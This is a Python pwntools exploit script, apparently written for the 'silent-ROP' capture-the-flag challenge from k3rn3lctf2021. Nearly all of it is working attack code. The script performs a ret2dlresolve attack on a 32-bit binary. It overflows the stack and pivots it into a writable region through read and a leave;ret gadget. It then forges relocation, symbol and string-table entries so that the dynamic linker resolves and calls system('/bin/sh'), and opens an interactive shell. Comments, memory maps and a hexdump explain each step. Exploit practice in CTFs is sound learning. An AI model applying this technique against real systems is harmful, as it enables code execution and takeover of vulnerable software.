#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template silent-ROP
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('silent-ROP')
libc = ELF("libc.so.6")
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# 0x08048000 - 0x08049000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; segment.ehdr
# 0x08049000 - 0x0804a000 - usr     4K s r-x /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r_x
# 0x0804a000 - 0x0804b000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; obj._fp_hw
# 0x0804b000 - 0x0804c000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r__
# 0x0804c000 - 0x0804d000 - usr     4K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.rw_
#

# [0xf7ef7120]> px @ 0x8048248
# - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
# 0x08048248  0000 0000 0000 0000 0000 0000 0000 0000  ................
# 0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............
# 0x08048268  5000 0000 0000 0000 0000 0000 2000 0000  P........... ...
# 0x08048278  3400 0000 0000 0000 0000 0000 1200 0000  4...............
# 0x08048288  1a00 0000 0000 0000 0000 0000 1100 0000  ................
# 0x08048298  2c00 0000 0000 0000 0000 0000 1200 0000  ,...............
# 0x080482a8  2500 0000 0000 0000 0000 0000 1100 0000  %...............
# 0x080482b8  0b00 0000 04a0 0408 0400 0000 1100 1100  ................
# 0x080482c8  006c 6962 632e 736f 2e36 005f 494f 5f73  .libc.so.6._IO_s
# 0x080482d8  7464 696e 5f75 7365 6400 7374 6469 6e00  tdin_used.stdin.
# 0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv
# 0x080482f8  6275 6600 5f5f 6c69 6263 5f73 7461 7274  buf.__libc_start
# 0x08048308  5f6d 6169 6e00 474c 4942 435f 322e 3000  _main.GLIBC_2.0.
# 0x08048318  5f5f 676d 6f6e 5f73 7461 7274 5f5f 0000  __gmon_start__..
# 0x08048328  0000 0200 0000 0200 0200 0200 0200 0100  ................
# 0x08048338  0100 0100 0100 0000 1000 0000 0000 0000  ................
def log_print(*msg):
    log.info(" ".join(msg))


def int2byte(x: int):
    return x.to_bytes(0x4, "little")


# at the beginning of .plt
dl_resolve_ptr = exe.get_section_by_name(".plt")["sh_addr"]
log_print("dl_resolve:", hex(dl_resolve_ptr))

section_dynstr, section_dynsym, section_rel_plt = map(exe.dynamic_value_by_tag,
                                                      ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

log_print(".dynstr:", hex(section_dynstr))
log_print(".dynsym:", hex(section_dynsym))
log_print(".rel.plt:", hex(section_rel_plt))

writable_ptr = 0x0804d000 - 0x400
fake_stack_address = writable_ptr
rop_offset = 0x0
fake_rel_plt_offset = 0x140
fake_dynsym_offset = 0x160 + section_dynsym % 0x10  # align to 0x10 multiplication + section_dynsym
fake_dynstr_offset = 0x190
fake_got_offset = 0x1e0
fake_text_offset = 0x1f0
fake_stack_length = 0x300
# fake section.text
fake_text = b"/bin/sh\x00"
# fake section.dynstr
fake_dynstr = b"system\x00"
# fake section.dynsym
fake_dynsym = flat({
    0x0: (writable_ptr + fake_dynstr_offset) - section_dynstr,  # system\x00 offset to section.dynstr
    0xc: 0x12  # just copy paste from origin section.dynsym
}, filler=b"\x00", length=0x10)

fake_sym_index = (writable_ptr + fake_dynsym_offset - section_dynsym) // 0x10
log_print(hex(fake_sym_index))
r_info = (fake_sym_index << 8) | 0x7
log_print(hex(r_info))
fake_rel_plt = flat({
    0x0: writable_ptr + fake_got_offset,
    0x4: r_info,
}, filler=b"\x00", length=0x8)

call_dl_resolve = flat({
    0x0: [
        b"AAAA", # fake ebp
        dl_resolve_ptr,
        (writable_ptr + fake_rel_plt_offset) - section_rel_plt,  # section.rel.plt function offset
        b"AAAA",
        writable_ptr + fake_text_offset
    ]
})
log_print(hex((writable_ptr + fake_rel_plt_offset)), hex(section_rel_plt),hex((writable_ptr + fake_rel_plt_offset) - section_rel_plt))

fake_call_system_stack = flat({
    rop_offset: call_dl_resolve,
    fake_rel_plt_offset: fake_rel_plt,
    fake_dynsym_offset: fake_dynsym,
    fake_dynstr_offset: fake_dynstr,
    fake_text_offset: fake_text,
},filler=b"\x00",length=fake_stack_length)

'''
0x0804c100
AAAA <- fake ebp
// we want to fake that system call dl_resolve
// push fake section.rel.plt
dl_resolve
fake_rel_plt_ptr
-
AAAA <- fake eip
"/bin/sh" ptr <- parameter 1
// some fake stack where it call system("/bin/sh")
-
// fake section.rel.plt
{
   Elf32_Addr r_offset ; /* Address */  Fake got
   Elf32_Word r_info ; /* Relocation type and symbol index */  point to fake section.dynsym
}
// fake section.dynsym
point to "system" in fake section.dynstr
// fake section.dynstr
"system"
// fake got
// fake text
"/bin/sh"
'''
jump_to_call_system_stack = flat({
    0x18: [
        fake_stack_address, # ebp
        exe.plt['read'], # call read to write stack into the target
        rop.find_gadget(['leave', 'ret'])[0],
        0,
        fake_stack_address,
        fake_stack_length,
        ],
    }, filler=b'\x00')
'''
origin
saved ebp
save eip
stack of main

we want to fake the main to call read(0,fake_stack_address,0x300),
fake_stack_address <- saved ebp
jmp read <- 
leave;ret; <- saved eip. but we want to first point esp to the our stack and then ret so we can execute dl_resolve
0x0 <- para 1
fake_stack_address <- para 2
fake_stack_length=0x300 < para 3
main
'''

io = start()
if input("debugger?") == "y\n":
    pid = util.proc.pidof(io)[0]
    print("The pid is: " + str(pid))
    util.proc.wait_for_debugger(pid)
    input("press enter to continue")
input("send first payload")
io.sendline(jump_to_call_system_stack)
input("send second payload")
io.sendline(fake_call_system_stack)
io.interactive()